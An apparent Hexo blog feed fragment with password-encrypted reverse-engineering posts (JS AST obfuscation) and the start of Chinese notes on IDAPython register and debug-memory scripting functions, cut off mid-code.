d106463425d1ad1c90948ff65b2d2297b70a9feb80d03e6db5835c8c4075506c40c1fc42ce3742eae19b089101feb97d43f699904df15ee48415b4fff42fb4ec7c6e38d56c7940a1007d66fc4694fde8b5c36544a1b75458ff32c3a34d287b9a9cb06d2b8e9134b8bc6515903a79527d2d726e9cf05ed665fcd1ba638a146c431d9c6fc81699060ea4c0b87a20541efdef8c0be78bb5d0d14bd9df7ce83578f112b55b4ab5da85adf0d407a012b9e2ad79e661241b0df5172700fcf70e5cd1cd95acaa1b914b2c973c24478efe44cbdd5cef6a109161a230d70eed8b6b3d61d54b218944471927e8df3a2666496764a211b0fa2325fdafe565fb7bcdd7f5f4351c764a124605d626166c10581a19c0cca678e2bf254b0b3625747ea9b47a3bd88336b9ad04d146e10ab7a4054b71c89429606e913d6ee7717ff6872151f6d03aee96550fe0a1dce39e459a44ec0611a7a5c80dd61b90d85d3c3700f3ef8172be6d99da084dc6906f9e2063ba877922bb32ac0aec071003f58455a4cced8208ac85f8669ea10a15f8f841b4684e10d21f2c7b4e1b119d07d72a3e86600ea17c8b62ce2f932f56bf1d54d47bd75caeb3881bf4e3a3658573cac2106a10ed86dfdac461b1973dcaf349882a69d4df59494c72ac70c9a9315e29b61ac1969c26d45daf743ae2afaab4b922831d761dffd4b24ece779642839787e62382da5a5dfa425a6209095cfd27328b1214968b1e170f764ff108721da328cf85f5ab4c63e53710824e06b74072911402f8148d15808cb1ac135ae27809e247b11c271cc9b4e35ce00d7eed4bd546ffee4575911d0f0278fceb253b303015b5f116ef80980002a062a76841b54bf1b8cc498e3779a8795776543248c91e69fb1b642af54c31c1158f3d3fe88445c7ec8524d4b60c21fe833f37d0c851c86a629c81e44d5f44fcff724a9123c02ff67a5ef2da2200ee5d70806f9c1b1abc636250db70d9d6ec8ff1cfadd500d812fab98c72851e5a0c58e1703848f5830e135c56fbfe75bbba20786cc38c6b7977bc6394b344554954d97ccecdf8eb2115005eb3116df02e625ec6d622b383719cb76c9cf1cee51b7c5661db74014b2aaa4b534c21ae602eff82a4eba2b97b005f0624f84d8cbe08db143f5cc0ba2fd4a96474f58e611afaa3fa4d418a4a2140188f57cd780cfe58771f6c8c6e2d458888f59c5ae415f8fa015d22c2f015831b78bf67303a55ca2fb6a0aacd5ec6e10d0c5f9fd88abf3be8fec753e6c6ad483eb617a3e2d1b621d814695b3f54b35a4c45efe0163dc874fe87623ea4c73a20bf9e91d4f363fa9054a2dc425437f5d495e2ee096d15a2bdd3870248a23879801eac16900e082db24d6ae19b1ef96d9cb523669e0cdab471f2d2fc3a7d8979273782d36ffd80081585880b7d622ddf7f0c66ecd82f575cf6ea8e3466489d9e193edd0a6241353d0cc4e9f096b0d87b1a5f458ca30c2d22fb8da46212ad78192040c59944af8aa2f937f61aabdae1b530d3ea53c1fa7edd14e308fb140a2928743630ab25976e54598c0a8cc2fe5d1328d58e15f87564ea648dad773db3cd9146342370bd3bdacb1053cc8941f4ece56e91b348f2838c0bb9a54de48a71c9b119f7e5d219cec26315d4bf3528fd4620975aaafd49ffa975e75b692e5fb0cb94992276f0e1ef6956474c06b021894907b9dfbac0a670ff48c75d776f9822e1b91d6d9c377852a2f1de1ea5df8e9c75328f3c72ccdee509deb02f0c8f91e6595548786eb08896d284b229e0f78926e1872d085539eea3199ca4be3c859f02f1b3a17c2db4a61547fe4d288a86e3cf73b0c5eee2c007f0f80616d4f839b1f7da980e2c31930c409ab49025cadc86502ea0de893ee691cd7b506a39f2bb65b96e1cd0fc8ecfdbd093e8bb3d34ed10ee3288fdc57419fc1c5c2669c9fd3a8df4c9d0b4a9618c2e0b8283537b37e5bcc8663caaae966e523163a82d9bceb803f41f53af0b8875de363d4c38b597bc299579eeb9cb40802ea24acc84deebd7ed900df2b1e765a0c2625b970b5766e09fb80a87736b5eba774cd0f59b98a5279bdb3c8f039bf56631da39bd03eef3aa12c9366e7b11e5de47cf9e850bcd36d1c3d00505c59c1a61553916b60327356f0a9de803141a3319228071480b5a4cb994ebb72aae801837f0302da2ee5da4e1fd6b6190af0ed2b6ed6adb90d6d21119d3b77eab71f851a20c43e20d0467cc13acdeb507d2e5bc791a829d0e8688cb9c04c8bec1b9acaee295dabeb81d64cfcfe5f3d8de5b73b8979c78cb8746d8f6c869be6398da21d9d4f37a199a92998df7f3e815def15279a85f8d0a7dc14459d3c3008f661127ac277ec1b5e5e397729df4df401de2e7e26b75985aa023a2adc644c1229667241ce47f01a50e817278e3481a708f9b782196b7e6d5226ea375cb4966dbc61de0f70b5d267136e818977dea0fc7677579bb1441c295b72b2b1aa5271ff546af8546abcdbb8a6f518049e2f7fbd7ebdb87fe2f3fa9aa29dc15a66156ce7f47cb0ea50ed74eca1cceffefdcdae49ab016ad343d666255967b09fbbb9795048f6d92a8b68136ed8f40f08f12e022a5eebb49ded7c4b015e972520728e7047f092c9325a1b812fa509b24d66f69a1c551ca5c40c511aae7ba21f05c3c526ebd9c31106621ab31eb82e8e7d873bbc0edcfc2e16bd74185e91f0c446046be6f2d669c0efbcaec5f78d1799f8f63a49b74539ef996a02bdef0237c91a4a04b2e54891d91f7cb67a6b4c40873809324ff99c08441b15f92d02855ac4c8168d21b992b56652b75525cf752bbc9a79130113485ae5ea9fe01324449924c529c4b7010a4fcb6f09d6eab22dee0ce3d08145463598076cf3c2a48919f3efb49ffd369de34376d613e16a791efea72e9583bac6538a87e161e2e72139aeb77b93560779701db2b530ce0284b706179f6fcb926221d2c71da124dc9bbff790fd312f0dc30696a0fab56389bbb72fd31cb04442243527cadfdf141bf687d56fb894bbd88e7309be822cb3c8b3dcfc0bba8fb1d28ddd980ecfbf8bff38b4aacc5bb85f5d47ae082c6ddb7bccf26c341e6f2e84ad2efad678dff0b0c9941ae6360156ec6870bfad737e295b21560038cee758a9225f779c3bad60159a881cc2ca4b43bd010e58e71a55469adde0851359a713bb4f5563ab199526e7599ec3a92602c7aeffd2606c84090d64c079d24511308758f62b32e6f9b207b20337edccbd09d23c0e1946553729eab331dd19681d5a03c33a24edfb62eb84f20bbcd28e54a3885a8b05cb7be59ef74d8f3b04a11a2ad7d19d92b5af4666d179ce880c0ffcf54d6db49dbe544ed8baaf36ed227ee0665f5733392795158d6c4f03a03f80ec4e3d8637cbdb15d7d91d0e4619ef13de77a5e5521d5920ac0e99538d7fed24cb3b0d2d79b34c7eabdbf7897b62205706d41c403344177419bc2104ef7feebf6652486a12071b2dab809a1efe4ec153463db60699df993e5194e55cb25f89ec295e0b403e2e42a4cd95793a6e99f07548346e6c62a08f26a510a2918c97d0996504a7439cafcc8e1929ebc0ddfe3d9681a5888542cafe3f3babf89cc6b8fc157cce9c885359f85113cd86e0765bd84700c17d6d03d28d6801917bd356347f74a0763ad4e9825bedb356077a32d8410d1e118715b857b79f3e829499f79a4482b52f8534e0d8e2cf2993258d755669eb659de6715c29dd981dc164e5f47c73e1ffaca461e9fbe5917b692495246ec2ee28c522c20899a32e593889574c65a1a612195f8abcdd44fd27028a05d5e5d94b634b444bb2137eabb98dfde8d11a6c03c71b7900c5f00ca35c4de34403b82b1f51cdf58aa50f3f8a4157d551cd961c8d5ec133c8433952db17939d8990098419250d6fa22182304bc9f0519cc03404c0db4544c4b24744ceafe3afbd792a1d9a7c75541d301139dde171cc9235082efb924d003b1ec9a38749c675e62b4ceeb9615af5afbae4121b7afd0d8b150b67b9e10c25829759eec30553ad24f964a0f9b927f0bb40671187ce1578c76412c693205cc1f3d70e2bd230a6898d7c9451d79862c6f43c05fa93a2504f14964f8da5acf97a91b05fd6495e0ec1e4510f286962d1624f801cc84e7c1fb4e219a15f6ad105811609e8222683430add0e081580ae3bcc043cd998594c38b78f6223ce2f5fe50a2884d082c7bdd8672f07271ed19d1897a12f39033d447fe1e2a694de4a12a8102739b7fb58ae831db673ca55ad672b0096e9427ec0d902b07030409ef07098eb5963ace2316a36cb89e505b40e66d115b4fba66b63a681bb798cd50eaf124313283b37b5ea08039c27870c1eba8cdf61cf22d0dd995d14036979444ec1a68dbe563d4412cb86ca6e7370090f4a23bbdc50a1a413b5cb236c49a8f394a9580857573e771215cbd1718a155482d9495747a1432d11354287b223cd22a2bded1ab6b918605af843e19b407749bd7231429e751267a04efd2b2e14dd568cf8809199602fab8ac5960dbffa23140f3960d21648010080d45f66337b6cc0cacc9eed17546cbe60e977671d19a4a4f68d9d0771bdf1e13cac08adb47949da97d7b5f18776bb07df2a2bd84c561c2682de4e0b4e02fc4dc8a20166b233b1c509f5d476fcfe97ee5b9275ea9efe99f3ac745c31fcf424b8e6636bbaa941a3493cacfce42138b37f596bb5e11f8628691ca093ce6916c9ddece2317405f203d6fb808aacf18008aecfee017c186029f38b5317e43b21a14a5080a7c88a5c3bacbd1dd696a3fced61007829836ecac5cd1320d04910712212b6174419d24c333560580e2540947897b579c9c3af91dba97990ec882c0537153619390349cfec7442bb2ea5efb2d96b97e8064bf083cdc93cc926b9659b8ae17bb56ab33a393b2951e06827d60e8ed8847b636f6e41cb09257be2b86bc9155c373a634640d0c885f58430b612e5e5504d223f7549d57f632ede74860a6c865d0e19d3bc34d8dd8d19c653b1169b8e09656bd8fe2478ddd8ec493c2f2656f3d6e3520b48688a7bcd25f21c57d2242c93abbcb470bb38920a799a0c82676770ed53e0ebe909407b1362c77ba08c92a6d737d8e0f022dee4812f40abbf355b2eb6bd571c5ce250d1fd694923eb0a36355a2df509756fb7c88a2e56b8958f38d016e255cd4b2a385afddf1a46f261d3207661bc35a0a048610e1bebd5e3b08060eb7347211e1b628e63dc6de4ea146556c7dbdb170cb15600aa86fc153083a74d15e1f55efc77a646c29cdcef42d2f94157a0a132994f00d199cca8b515092baee5cc5f9d089456c76643beb4efd4dc46f2fde02f97288878742b740098c1d16d75ac8c645bcacd1ce86d29d58874abd4996d7b19db7f6ccad0889a47a0f283763820f45c822a0a5f02cabddd3ee561a945c775cee3f0df6ddfeeae8f2a72f1e8db6f9b1b28e160a6f587962a48cd944e8b77f046c75bc547ec90ca68dc8570e9eb3b26f3b5a9c9c6b2ad49ba5ae40df923ecda1defe15662df168c6bf1d2618d4867d82920fa25bba3405d9cf31aefd6410eec7cb38cca42d446b6613ce65fafa48b35b1cb63773eeba851c7505366ceac9761fd4c4562918a707e33f10ddcd8231dc05e4acbf8b09100fd3fbab2f9fb5d137e252cb93e6898151ea4e290743993958f7b1313e1eecc86c1bb739fbfe7f6ebb676b24a7c3337271e36771652e6637bd3e0fd3a4dd3f14d8713972aad6daf02d9bf80cbc564db42e1df4e1be1263903d8b99251b95c1bacb3d7d64252f6d6c73e456f4a4cf185c7eaa8e80a4bfea87b6ad5a7158b350cb43327c62db5bbaa8e3107b8dd27ef348e7359b07fe944896bd0ce97cec5ae5ea98173a8b1501e8bec9ee89bd14a5a1ea6abe9ce77a587938f75ca291631c39833a68c555787e2535131cf5dbfb70ed1cfc8a4cfc665651e51bf00721caf9fdcc27255113d077b0818377265f73549a8479fae58a0eb09fe5f67411d9104f6e2110eb2f287c337450e50b4c6755057af69ed03e0c614d7f00d2babf3e3eb630b54bb6c211c5df7265bc8ab606f44888118983164e4cc05a49666e2ebc40c0b2ca0ac30c6664b89faaf5dc442f2399493c67b10283395ca548d02339f5f1ef80315b869a67fd6f0da1108daca35b94884fa9021ae09023db12873ff04c30d55f6c38a7703bcd4552d505f8791657301754ffe8c39d3fba03e7a0fff0ea1d5c90406cbe3db05a71ca0edd07c87e462db7b968ba648f1944cee7504356fee0c572a7904b9d3763922f86111f8900abbd9318eed161117c47535f82c4d40ab06451948e44883e7e5833c0bb02753d1066d9140955c83685788961a7e0f65fcd7a704fd180ee7037806e3955cf54f2a6ea460bcbf7ebad46aac2a541b6b3ac7ec17ff9ac74d76298e3f8a9afc1b1924b23357379595b603f5f6054526c784fdcbf92fe6afedf2118478a90bbd0337591a0adb5cd2e279d2bccedb6ef37e615142014dc148bb135da053b22c5215b0c7be369b7472496235ff4ec9b02c9281537ae2fe088b5e0f40395b6b49e34754576e43a8a294d49284aa541ee01a37b8dc1800b0f5f12dd9f14b15b2e4280cf9e2c96153c18ac3c9e6534753f4a9766cd9c1b0b2058df6d0401b96c37b55b5dae78111c11bc94203899734ff4ce96f3c05283438c7bf9a56cefe2c4db5969741e008c445987863426f7e0e424e8e294842c8ccb0c28169970c8cbf90e64adcfffdb323c4cc40bf4e658ba27637261b153e5edd10e28de54357c60a271e6fcef2d39d0b179ee6718b191167a8f7e0d809cf2668341c310bd3961f46c3067c7dfb5e7fb18c13df509e5e84c2a8889f03973af96ce86f6443a617ef593d1194e322a9a57c3351e1a79299995e2d41ac7dd705e38749eb7b0e1e8fc67856e68bb7ee070620d143e4c9308c173a4c8851afa444e23813aa6193f9e2a56bf03adca19ca93e14ec54aa56ebdec5ac7549c41acfa56f20e1da4a691c8f5c5e9041b66a18b75d83e300d5f0eae5650e3b6d0eb4bbfb8a3330ce4495a6bb44f8136e53793c37d25005ed6f8bb2b7a2beb97f5e9a1dc61e22f05122ff589423820be5a527d26d0e48c3d3f325a8c9325882460d9659a62baa3faabac0566bfb5860d79328e2443c4061cdf2ff382252bd3e16dd76b9a3e17473c98787d60261457bd7420b78d50911f238a48f1f8b4ca4be6db8cb05d0692d8c0626f896293ece5d48a97639527146fc9a7749171a9c55d2d03d9faafe11f5f866658842c5a114cee5e8140ec1c4f1b8a7d083416cce3b67ddb38881e9f9440e6bafff1f8a86baea793b23072d066814b9bf971480882f368ef34610c5f585742c045c39291d3323861458fa90646fb9885e6e2e3fd6579945a8474de9c233c563be64dab0de45995e4eef022c0f13d53a681ff46bd8da929880f6d0fb5de896964ebb4c0f461fcceb109dc9d5e192bb8126fe100254789f52c389abb7f60f793dcb8e0bdda53111b492845b84811633ed2274b1c31fe2060de1a4367da5ee018f50d855a21712e270bec5f6899ca9a3dc074b4372dcb347983fdc8185c759fb2ca73bdb3c9abedd8a35ce989200a0310f19ce38fb9f5964d7b132397fbf0711a6b2b665339a663ba54c172102f2d437de3c19f0c8e11b51718d84abdd40471ff7d7433acd7e30ed5ad7fd0e10b10b4b9de5cb01f19125a53767fe9e435f8aac5e8be853e9f94a260a3d40ca54d1dbb804659805bcef61748aad661dc34d2c25af5eb3b522218a628cc93cf4a86cfcb48b4784328d66f5740284363c5b233505d07337f1aa163e45357785aceb854bda8454704f104f00426e10b5474a3b9e1e7cfe0df0b571972b0e9507e521ae99fadb81d21a7ba7f5a63b7722985259bfad082781f3a2157721486890c3d7fed244243c24159587f0bf99c417a9671c454884283712b6f1bd837efc777e149e2d03b17cc3245518f3cd60ff07d9deafac08ddf521a45a43590ac11169d93143e01a3ae89db06b8a368b36af75c5edf9f0bc6c9a21820c93dcf336e1e868d5fb6849cc561d37b86c31eba6bfa172ca0187751fbad680093e863325640678da2a34875393b2982e54154f93a615ea62ab394b9827f34a8c5fd27c975ec5618599d9c0fd1b9d88de87314be1e52189eaaebea3b44ac3c7561e481ff2205e7fc1dd7c8cb053ccfdbb0fbb5b7b5c58ee9337a3660a7d61e279c9cf172938382f0bf0c2e372b9ba633a20e123a79f5ac510f688866e301ace53f2b0a0286dd3567d9b142e1ca47be5cc11723c619a5cf7b146a304a79467dd4fb99bf3d13e8970b9224fa1e84b313b3e87dfc50b55108bb9fea38cdcbba23fca7c049d5a1d3c7f1102d0c7818176f06a4855b717f3eb7bacf2e64b56d68daaccacbe943a27b4c942339a7aef91554c1c0744a44e36dfa107bc98bf5c1f0dd13169d1e3792b951cf493c5d7c18544de3513edb7fc561d288af32749240ade22c98099651708529ee71caf4921ae4c1be91ae09ad01b61fd2d3d13059dd30c56649b629043e5ab63e631fb04a88fc201f80a90bc3a85c74e05dceeda6404f11aafca5474025d50603cfa9b15befe2aa6346ed74f20e749685e04cf302a60fa7b610983acd593b7a43ef182b2c2ee56f75e5a483867046802ddb6d77af22425899684a0083725b5963ca2783a46135479bdc21763352062fbae34db8af7bc5ba8b68b21a384d26b2d8fa5cefe38f6f43caaa0da381dd23c95c401a27cad58a7262ac7411d33e404455ea5163ae5ab179fc567f8a79c65ecb5ac7a20d0a18d06696c8576915e72e53c3bd26b9ae269dd81b1f4b8fad3cd616f96c6f698105348463c140b2811a74d9a07166e4866622f45845894737d56eaf3d03e8bc09afb3984e8ac1d67ab22e7882e683a94388e7496b31662efb1e7ec40a67f05defa19fcb706afd0899cd450681222c86f8f2c94b2b2ea23df140ba458d1a3242f49563b0e57704c3f3186fbc1554c43762be111a43ebd6a767e70d1185b58551c118cd3bf5dbab4590ffaac68e6680f5b3c270a71243750a262a13a5be434391cf504dcf3090736172c8bcc9d793b92fd0ca71250099fa7dadb522e8549fe2ec90c0ca99bb3887d33ce52517bb71f74103d3ccfca5330eab7fff5948f504a61b9e72f976a48cbcbf399f3441e3c2faf3f2d29f5d694f1b11f713dea78df5a05307bee48a731b05f1ea86894d1ff1dfb15c159394a0cd9432aeb1acbfca08e14cae48963d007a7ee90d123487da0fb4c9c0e77918667e8f0ec5dae03b2b48ea179c4d561f25dc74b44a1e70b97390db84b98ca75a0ced4d2a58ea02b659b4381cf103094665db51c5c67c413de52556f6f02fff76fc5d7a481a3197fc4ec4d958ee4a495b1a24cf48f2ea305c1d846594f3eff246db9ea761028dd0e49a47a79461738d674ea80cb5e8b4c651bad6af01a3b281f2823476107822eaa0e2bf85819ae6ca7b8e27312671105dd6adc0e1cefc49fe7152395509a22ec03f08a8d1567569e94aab436de066b886bed08d36658bbf7a0a2df020992dbd8f5c4fb323cf89242daacac12bf496f5377b6557fc931af3f72d43ffeef9ee53d069f9ca79b88537f95ef4a47d9c69954d5e067af6cc972de7aac3b741e0d3992754824687b60f652c8b749813792293fa9da9579ac424ae6679e2855a998f5d055d108569d599885d46108f2e8f8f0bbc34dc58277aa9f0f9b13a14827f4ba2051db470158b8f06c2f206f630ab4e407c47797432e0b4d6cfda26d15b0b964237c37578eb249ac29a66df27bb2b63be330aacb47a4d3ae9a493ff819469d92213a521d5a7993b04e147bc2ae8fd347d74d9a70842714f3359f59eba3f8224c0eb0dd54c51575d82fdaa0554d7477efe717f458ded81fe6e84dc72f1d9c152bcd982748f755498e59c64030ee27e35f11f5b790ac7258a0a35882ced9ea410ed1512cf84d7387482c054726fe6e6508d906f8a240e8f7f2da5d21ee10a1bb9797987119b0335b298dbb667146e13772f040fc673db2dd68690b61d7da03bba179976be1770c2fca19682606d5eebf9448040b72b6dc3d28fb25d19937a80de927ebf571fb0c02cf3feb076798b2e01481a986d9389e171ba2295a9f914a42a0731f510d42e37984627ed8348261b807b4ab19c30ccbae2763197bf5375d14788551cfcdbc7739a7197110cc29676ab3cdccfb4ce6cc9666c5526da523d1c998f51583b752f16155603399d6cf162db2cf40558151f98097fa472f8bf8a48f0d84e6cd48b98c83288d666d8597ed09981e35cc1607b938004e27f29374770e2abd9a4498578266d1961e8ffb31a238e8ef3868105811c923d40a3d8d0088accf048e7cec11df61ee81a51ff4fb9bd961aa65c01c6d59395f940d51e6156ad38f8fbd8b624fc49200bb6ff1908126878d614058226a3978030381dde32f435d8caec06dba0005eee20ef4fe4c244293186dc7c40ec054234f2b56bc8471571e78fba5788a4c933f664eec162f2979a5c6cc36cae536e44a23d22c0ef60e3cfa585f94360f08773e1a92d1080a935126945a71bb4128c0494a341e789aef4c78e31762e39b14355ed5911adf77ba6097ee264e7baf4f1e6a3c036051b29e568a6c04390e9778676e48f2bdf79e8782e8dd18e2c38002ca021733c283f17d708176a275106bba744300284e6bc9c145e97d93fad79684457e7c99ecee6b3b570cc51142dc0f006d0312239051ee5fcdf35feca710bca6dd4c28a9e47fddb115062a666983050da4cac80a5dfee18a942b525bd6de215a26b999305c9014ddce4b4f17ffa2b34c87c2e2d67c63be7f8f049f1d21463bf218f4b3f762d29cbea592f4e64ea2707238bd6b46fd2e93d95eee316f1f2d82845676630596d33dc58353946f850f718c6f74bc51b19f36f38e4210bc206492f7e18d9a74278fdfa1dac432b2f497543b04a5beee40eae29ba7f490cededa35a433d16e585c1f0757092f147819edcf51e09b79f550d17b8deabccdd386cc7029b2df1bed2355a6c8846e3354d578ca2b52ade2db85ff87615e3aa5897141d89390572a74b6f74871780ae63860fbe8be156aacd2f896e016cd6bf04f669f83cb45b4c32224706e90a20c45faf2c0b1da12c624af8bbfd39a4f8ea67410b17e418e7bfa767560ceca467606eabb4aeeffab522f0caa9e98d67fbec786c51caee3d3f55819e2bf5111951c6c6dee5f14417e6c7be3e795dd7800ca84a03a774af98da7413f8a4ee75c3a283951c3391055c6af8f24ef5312a5f49878840bd069edce3cf17be915de48437ab249aa3d4f9f846dcd114717901464ee3a2b8c75cce508d7dc73efd1a8c4df618817638761ccdee4de46a9aab1316d9371e065a5c562677c4f25ceb3f4873ad440a7ead2f0643bc4a545cc614f9ecd734265f6f6128498d2542409f01f2012d51ba3a80a8d081894ec94ed6573e5e7a037a8d610b65b795fe1718ad9b1b204eeefdc99fe9393f81fa104439596a13c83c7d4fee540e750ea9f4af7ec26efcc10b93208dd9af523aecaf4e9267f5f03294cadf294b7253487be3e24e749f1842aff6c5c694902b8138ce8fe54b8af86a9b36028f2fb5a172ba27c85e6f6d24dbc60a6fb0a497cece1179a9105518b6210d9a901d76ba489d304f5920ce0672e49e9a4396e2e29f23a504a83e2704287ccb62e5efeca0be5eef61f15385f8d6e3a43640eb233fcb90854acacfc356ee53495fe7c2ec7ceac2f89c3558ab343c298264ab0e8b52e92f183e2e29e8256836f5c45f260c784bc6cc15d731766668a5e0e1d5518681f457f4424f824506c081a3ee9f755e7676e24f34f3d5f0a45ea2318f81724bd816132b915054ed914579dc058deaca729ada0abf673aa26e4e0d8ee2fb45aced69de94c1f3d2b24f32845a7546eca0fb21d49a2a1b37e51472dd8390d3bf83f884f47b6d8e22197aa37d55f4649cb529e59e57722f1064b83511eafcff0d8db3c8c96ec651fe522d4781a1e36509e3d0d6c6cd7e502f7d0c2b11068d7075bf51374d884ee450cbdf93a96ab6923178be6802068390739eefd041f340e997737b3cdf8598614d17688c8b9d16218532501dd0f8ea20870080e57be98e7c7aa429e8a8ee1d7f83402f4c38188d7a6056555a9389da9c6e8c899ece79e10a2b4186b38986d64257a56e106c979386b484c0e6480cb9d2ee7da60e1021f05d0c421652f752dc933aec7e95f01d3884912db52d68448de0aff453187f6cf859d767b5aba56f818da824c3a27f5febfd3a4f242f88403d7261cb7aeedef632ad091ada6f4ec65e902b42877d518fcd600f2e410920fa6ff66d4a9540e1e9749f22176913e0e8cffd17373d28b6daf3c989cb8b3c90d5437c6f9d9104be3af5d482c5412439e3323d4f452730f48fcbfe6432487cd0bd0f6dacf9c99e20db1a467e4969577bcbd59f48f64b2ad1e17fde65b4e31c6eae0b3e8f2e0512222d4d4894cff6a02682b66cc155a703d6d8a5977cf848bb89229ee5ce5200727b5407a79f2e5d7e52156fafc218140306e5ddba34af6f7150093dfc1546d7619621f5603b8e1fd7f93d68816a44f4e0bae53c57c7fd7c36d0e8576b57c9a5cd51e636b10a9968f79f11ed2bdc50c7bbfa666ea85320def3d764e68bdff2be5c6e41ef108515d3a7e8366323fb9b2637787acb34e32060f802e0e796a52855515a11551b33a13ea927b0f0515a86c44199bea959a4fe01c8a24a50c80ecadae8bb3909b8443b7d5722d16ab48e6381f9a7eb764cbb2b2e7f9d4553b83007dd6c8734ee0a32c4d12d47d9f1cf2f8d9aab6c0b023ac9105b244f1139f39cbc3468883702b88a51dbf2289090155befea0c3326a1e36355772e5822584bd753a7b5ffcc627ae6c8b5761c6b9b5777a1714871196dccbe201cc8114571b2b6184d7d4e2400785569404961537a81164a38bc23bb9281cabcd0c6d705e016c679d2c34c5715ac0812e36e9a294073062d40535ea70e3569801aaf028fa00bec8686bfa1272140bad062275664f33c44aed606e1de7e1c65b44a38dee322ae684a424a2a728776d8759e89c1428b3c14671d0ccda07e55a03f8dc0c86d5bd6a31dfe1658306a172eb9ca58c76662c43167eededaf1c9260f8b1d1fd25971305a2027eb07da762028858f3bb81d29cdfa08abf4fb19960d6b541dc0cd75839d0e2cd2030695d79e229c294cc8c6620cb34c599287e1b5b9b5f5c96d9799fde9ca3b2016afd231a597bd6e791b9f156a0385ce7c59a051b834a82d01c86007686fa4a49356ce293908949578c917cbf6f48c8e4f506b0eaff15fd107559b471111c8ba4bccd6de0029f9ae5036db62a5e94f5665f430625e40b3c5f88d5289ba8b9a54122be1f52f16e605876f5111d4eed9e5b203e784e7e40ddd543d0d04708864b9cb9ae7b3d10386516e485815c62b17ccbb820cdfdd4b7c34ae5f9c21aa2ab0f353013b4f8a9db9ee1459b1b8cf03d49315edee9e580a5c9d6abc4c22c2df802e49668a51f9f0c689deebc8b2e15c4ee2c3241ac4adb8cd3d5c185050746dfe0e3cdcb22e80efca78ff0f1c548a6f8237802af5afe93b543671d571cecb95dc8d1d32c9311e750091d56f3511da8d35d641f810db82dc7b2a19bcb76a8e07a3bbb6fde2852fee612b3b57ef4cc950fe1d723c8d47ae5d78b1966e2ad2d62f0ab09cbf8f3a92b88e0ed7e2f058c07ee66d7682c89f9c24b5d112c36f16c2f39e42baf6dafca8afd92f013585317ee0d18fe1fb417d85f28afbba4a12b4f766319b7471e14b1e21e198e78b0de3e5112211b11f3c8a7ded14790a808611bc609d09a77a759522809651901d85eadd408b71dc99b2afa65c3fb62a2e2cb4d3d91e9ed9e737126ccc8c3ab97af3443b6b6bf1a2215184660da0f2eb63210b49d27c83e0868fb8d0e0ce5a3fa9fcd5a35e2a36fb0a1a0285ddb6a59f0514a19ba94196220225f6059f3b5f59ca5453bb70accd9f9d0a7450b6f7b7a4a4dc47c77e4f61dcc6751163ee5221116220535f312a7a21dc8fd5a571f7881699f0c83be22111bfa3394d3d864020e64f46695decd5cd4ff3b1a95c7e23bbe12b61aa7dbb2182cc570f473be3b81eb9d2794469a1fceed19661194bd023d8037e540bd1e610fdd103cbad9c15867365d40bd127c5e9fdcb5a1adbaf7cb9898ffb160661d5dcb36b73d1c50e0794d29966875f3e5a5d2bd5a0fa20ea0a90db8133b4daf0702fcb558769a382f9091f6a9a10c71545e724ef0922d02a6930b7336a492989b0d69b25004831bbbd575eb57ac85aa33ff714ae5ba2bedad0313b3192a5d27f4d0d7e007bb25106b4f822f87a7c30667a209040ee33c807bb72ec90e247b856ee6ecd221d6ce06be53b4704ec8e5cde73ed69b4f287dba33e4d797cad2b5faa597fef8bbcca963f28edf8b706bccc1b00c8900fe00f0711d938cc095369a4eea2e5aadc7c91f5fbd5879d06cf02590a4ecfcf8a0305d699e912570186827094e81aba0850aa2883c9b7e1a6eba1d0f5569e55772b2afffab0f3f10e1b81c2805604c1da24c36b4aeb29876a093ba220d13cd26539ce5950d2aaaecd82de13bfe794e638d03b524df97212f75d8782e59b8dd44ddb8615b469a42e906db7ae13d8cd1503b2f77c0cf7e283a20c1fe6750993b62285b5cef9f52c1bd</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>re</category>
        <category>js逆向</category>
      </categories>
      <tags>
        <tag>AST</tag>
      </tags>
  </entry>
  <entry>
    <title>AST混淆2</title>
    <url>/2023/01/05/AST%E6%B7%B7%E6%B7%862/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="仅限作者学习使用" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="3c06be602c33bdf2f600b7dbf6ecb13930b3f026731c790c15a7e34b8d7d66c0"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>re</category>
        <category>js逆向</category>
      </categories>
      <tags>
        <tag>AST</tag>
      </tags>
  </entry>
  <entry>
    <title>IDAPython</title>
    <url>/2023/01/19/IDAPython/</url>
    <content><![CDATA[<p>记录ida脚本</p>
<span id="more"></span>

<h2 id="IDA-Python-脚本编程"><a href="#IDA-Python-脚本编程" class="headerlink" title="IDA Python 脚本编程"></a>IDA Python 脚本编程</h2><p>内存分为：</p>
<ul>
<li>本地内存</li>
<li>调试内存</li>
</ul>
<h3 id="常用脚本接口介绍"><a href="#常用脚本接口介绍" class="headerlink" title="常用脚本接口介绍"></a>常用脚本接口介绍</h3><p>寄存器操作（调试）</p>
<pre><code class="py">idc.get_reg_value(&#39;rax’)
idaapi.set_reg_val(&quot;rax&quot;, 1234)
</code></pre>
<p>读取 xmm 寄存器</p>
<pre><code class="py">def read_xmm_reg(name):
    rv = idaapi.regval_t()
    idaapi.get_reg_val(name,rv)
    return (struct.unpack(&quot;Q&quot;,rv.bytes())[0])
</code></pre>
<p>调试内存操作	dbg 是指debug内存（调试内存）</p>
<pre><code class="python">idc.read_dbg_byte(addr)
idc.read_dbg_word(addr)
idc.read_dbg_dword(addr)
idc.read_dbg_qword(addr)
idc.read_dbg_memory(addr,size)
idc.patch_dbg_byte(addr,val)
</code></pre>
<p>调试内存读写封装</p>
<pre><code class="py">def patch_dbg_mem(addr,data):
    for i in range(len(data)):
        idc.patch_dbg_byte(addr+i,data[i])
        
def read_dbg_mem(addr,size):
    dd = []
    for i in range(size):
